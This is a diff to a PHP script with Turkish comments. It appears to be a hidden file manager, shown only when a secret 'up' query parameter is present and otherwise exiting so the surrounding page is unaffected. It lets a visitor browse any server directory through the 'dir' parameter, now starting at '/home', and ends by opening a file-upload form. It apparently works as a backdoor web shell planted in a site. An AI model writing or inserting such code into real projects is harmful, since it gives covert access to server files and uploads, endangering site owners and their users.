@@ -1,6 +1,6 @@
 <?php
 // Hangi dizinde olduğumuzu belirliyoruz
-$root = __DIR__; // PHP dosyasının bulunduğu dizini başlangıç dizini yap
+$root = '/home'; // Başlangıç dizini
 $current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
 
 // Eğer ?up parametresi yoksa, sayfanın geri kalan kısmını etkilemeden çık
@@ -29,7 +29,7 @@ $files = scandir($current_dir);
 
 function is_image($file) {
     $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-    return in_array($ext, ['jpg', 'jpeg', 'png', 'php']);
+    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif']);
 }
 
 // Dizinlerde gezinme bağlantılarını oluşturma
@@ -38,7 +38,6 @@ if ($current_dir != realpath($root)) {
     $navigation_links[] = '<a href="?dir=' . urlencode(dirname($current_dir)) . '&up=' . urlencode($_GET['up']) . '">.. (Üst Dizin)</a>';
 }
 
-// Dizin içindeki dosya ve dizinleri listeleme
 foreach ($files as $file) {
     if ($file == '.' || $file == '..') continue;
     $file_path = $current_dir . '/' . $file;
@@ -49,8 +48,8 @@ foreach ($files as $file) {
     }
 }
 
-// "PHP kodu dizinine git" bağlantısı ekleme
-$php_code_dir_link = '<a href="?dir=' . urlencode(__DIR__) . '&up=' . urlencode($_GET['up']) . '">PHP Kodu Dizinine Git</a>';
+// PHP dosyasına gitme seçeneği ekliyoruz
+$navigation_links[] = '<a href="' . htmlspecialchars($current_dir . '/index.php') . '">PHP Dosyasına Git</a>';
 
 // Kullanıcıya dosyaları ve dizinleri gösterme
 echo "Mevcut Dizin: " . htmlspecialchars($current_dir) . "<br>";
@@ -58,7 +57,6 @@ echo "<ul>";
 foreach ($navigation_links as $link) {
     echo "<li>$link</li>";
 }
-echo "<li>$php_code_dir_link</li>"; // PHP kodu dizinine git bağlantısı burada
 echo "</ul>";
 
 // Dosya Yükleme Formu
